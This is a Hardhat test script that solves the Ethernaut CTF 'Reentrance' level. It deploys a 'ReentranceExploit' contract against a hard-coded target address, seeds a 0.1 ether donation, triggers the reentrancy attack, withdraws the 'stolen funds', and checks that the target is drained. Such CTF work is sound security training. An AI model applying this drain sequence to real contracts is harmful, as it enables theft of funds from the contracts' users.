import { ethers } from "hardhat";
import { utils } from "ethers";
import { expect } from "chai";

describe("Reentrance", function(){
    it("Aims to Solve the Reentrance Question of the Ethernaut CTF", async function(){

        this.timeout(0);

        // Initial Setup (Wallet etc..) 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0); // Check if the wallet amount is greater than 0 (If you have any money)

        // Define Target ABI
        const targetABI = [
            "function donate(address _to) external payable",
            "function balanceOf(address _who) external view returns (uint balance)",
            "function withdraw(uint _amount) external",
            "function balances(address) external view returns (uint)",
        ]

        const targetAddr = "0x2e8a99A8dF9261C185D0B66Bdec27dc305752796"; // Target Contract Address Here

        // Connect to the Target Contract
        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let targetCont = contract.connect(eoa);

        // Define and Connect to the Malicious Contract
        let amount = utils.parseEther("0.1")
        const maliciousFactory = await ethers.getContractFactory("ReentranceExploit");
        const maliciousContract = await maliciousFactory.deploy(targetAddr, amount);

        // Wait for Malicious Contract to be Deployed
        await eoa.provider!.waitForTransaction(maliciousContract.deployTransaction.hash);

        // Initial Doantion to target contract
        let donation = await targetCont.donate(maliciousContract.address, { value: amount });
        // let donation = await maliciousContract.initial_donation({ gasLimit: 555555 });
        await donation.wait();
        console.log(donation);

        // Start the Attack 
        let attack = await maliciousContract.attack(amount, { gasLimit: 555555 });
        await attack.wait();

        // Transfer Stolen Funds
        let transfer = await maliciousContract.withdraw_stolen_funds();
        await transfer;

        // Final Check
        let funds = await eoa.provider!.getBalance(targetAddr);
        expect(funds).to.eq(0);

    });
});